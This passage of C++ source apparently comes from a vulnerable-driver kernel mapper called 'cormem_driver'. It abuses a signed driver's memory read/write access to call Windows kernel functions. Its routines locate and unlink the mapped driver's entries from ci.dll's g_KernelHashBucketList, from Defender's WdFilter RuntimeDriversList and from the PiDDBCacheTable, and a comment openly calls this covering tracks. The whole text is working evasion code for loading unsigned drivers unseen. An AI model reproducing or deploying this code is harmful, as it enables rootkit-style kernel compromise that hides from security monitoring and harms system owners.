	LONG RipOffset = 0;
	if (!ReadMemory(device_handle, Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool cormem_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, cormem_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");

	if (!kernel_ExAcquireResourceExclusiveLite) {
		Log(L"[!] failed to locate ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool cormem_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, cormem_driver::ntoskrnlAddr, "ExReleaseResourceLite");

	if (!kernel_ExReleaseResourceLite) {
		Log(L"[!] failed to locate ExReleaseResourceLite" << std::endl);
		return false;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN cormem_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, cormem_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] failed to locate RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}

	bool out;
	return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID cormem_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, cormem_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] failed to locate RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}

	PVOID out;

	if (!CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}

cormem_driver::PiDDBCacheEntry* cormem_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {

	PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
}

uintptr_t cormem_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		Log(L"[-] no module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) {
		Log(L"[-] can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(device_handle, dwAddress, sectionData.get(), dwLen)) {
		Log(L"[-] read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}

	auto result = utils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);

	if (result <= 0) {
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t cormem_driver::FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
		Log(L"[-] can't read module headers" << std::endl);
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		Log(L"[-] can't find section" << std::endl);
		return 0;
	}
	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t cormem_driver::FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
}

bool cormem_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	uint64_t ci = utils::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		Log(L"[-] can't Find ci.dll module address" << std::endl);
		return false;
	}

	auto sig = FindPatternInSectionAtKernel(device_handle, "PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
	if (!sig) {
		Log(L"[-] can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		Log(L"[-] can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		Log(L"[-] can't Find g_HashCache relative address" << std::endl);
		return false;
	}

	Log(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		Log(L"[-] can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	Log(L"[+] g_HashCacheLock Locked" << std::endl);

	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
	HashBucketEntry* entry = 0;
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		Log(L"[-] failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {

		USHORT wsNameLen = 0;
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log(L"[-] failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log(L"[-] failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				Log(L"[-] failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			size_t find_result = std::wstring(wsName.get()).find(wdname);
			if (find_result != std::wstring::npos) {
				Log(L"[+] found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					Log(L"[-] failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					Log(L"[-] failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!FreePool(device_handle, (uintptr_t)entry)) {
					Log(L"[-] failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				Log(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				return true;
			}
		}
		prev = entry;
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			Log(L"[-] failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}
	}

	if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
		Log(L"[-] failed to release g_KernelHashBucketList lock!" << std::endl);
	}
	return false;
}

bool cormem_driver::ClearWdFilterDriverList(HANDLE device_handle) {

	auto WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		Log("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}

	auto RuntimeDriversList = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (!RuntimeDriversList) {
		Log("[!] failed to find RuntimeDriversList" << std::endl);
		return false;
	}

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (!RuntimeDriversCountRef) {
		Log("[!] failed to find RuntimeDriversCount" << std::endl);
		return false;
	}

	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?x???x???????????x");
		if (!MpFreeDriverInfoExRef) {
			Log("[!] failed to find MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		else {
			Log("[+] found MpFreeDriverInfoEx" << std::endl);
		}
	}

	MpFreeDriverInfoExRef += 0x3;

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(device_handle, RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)MpFreeDriverInfoExRef, 1, 5);

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* {
		LIST_ENTRY* Entry;
		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	// Guard against degenerate/corrupt walks: a broken list head or a paged-out
	// entry used to send this loop into an infinite read of VA 0x10 (the mapper
	// then hangs before even mapping the target driver). Cap iterations and stop
	// on NULL so we terminate and degrade to a non-fatal skip instead.
	uint32_t visited_entries = 0;
	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry && Entry != (LIST_ENTRY*)RuntimeDriversList_Head && visited_entries++ < 64;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), cormem_driver::GetDriverNameW().c_str())) {

					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) {
						PVOID value = 0;
						ReadMemory(device_handle, RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1);
							WriteMemory(device_handle, RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if (!removedRuntimeDriversArray) {
						Log("[!] failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));

					ULONG current = 0;
					ReadMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));

					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;

					USHORT Magic = 0;
					ReadMemory(device_handle, DriverInfo, &Magic, sizeof(USHORT));
					if (Magic != 0xDA18) {
						Log("[!] DriverInfo Magic is invalid. drv will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					Log("[+] WdFilterDriverList cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
	}

	// The WdFilter runtime-driver-list scrub is a cover-our-tracks nicety, not a
	// hard dependency of the map. If the walk couldn't complete (bad pattern
	// match on this WdFilter build, paged-out pool entries, corrupt list), bail
	// out as non-fatal so Load() proceeds to map the target driver.
	Log(L"[!] WdFilter runtime driver list walk incomplete - non-fatal, continuing" << std::endl);
	return true;
}

static uintptr_t PiDDBLockPtr;
static uintptr_t PiDDBCacheTablePtr;

bool cormem_driver::ClearPiDDBCacheTable(HANDLE device_handle) {

	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", cormem_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, "PAGE", cormem_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx");

	if (PiDDBLockPtr == NULL) {
		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", cormem_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x");
		if (PiDDBLockPtr == NULL) {
			PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", cormem_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
			if (PiDDBLockPtr == NULL) {
				Log(L"[-] Warning PiDDBLock not found" << std::endl);
				return false;
			}
			else {
				Log(L"[+] PiDDBLock found with third pattern" << std::endl);
				PiDDBLockPtr += 19;
			}
		}
		else {
			Log(L"[+] PiDDBLock found with second pattern" << std::endl);
			PiDDBLockPtr += 16;
		}
	}
	else {
		PiDDBLockPtr += 28;
	}

	if (PiDDBCacheTablePtr == NULL) {
		PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, "PAGE", cormem_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx");
		if (PiDDBCacheTablePtr == NULL) {
			Log(L"[-] warning PiDDBCacheTable not located" << std::endl);
			return false;
		}
		else {
			Log(L"[+] PiDDBCacheTable located with second pattern" << std::endl);
			PiDDBCacheTablePtr += 2;
		}
	}

	Log("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	Log("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);

	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);

	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		Log(L"[-] can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	Log(L"[+] PiDDBLock Locked" << std::endl);

	auto n = GetDriverNameW();

	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, cormem_timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		Log(L"[-] not found in cache" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	PLIST_ENTRY prev;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] can't get prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] can't get next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	Log("[+] found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

	if (!WriteMemory(device_handle, (uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] can't set next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	if (!WriteMemory(device_handle, (uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] can't set prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		Log(L"[-] can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	ULONG cacheDeleteCount = 0;
	ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	ExReleaseResourceLite(device_handle, PiDDBLock);

	Log(L"[+] PiDDBCacheTable Cleaned" << std::endl);

	return true;
}
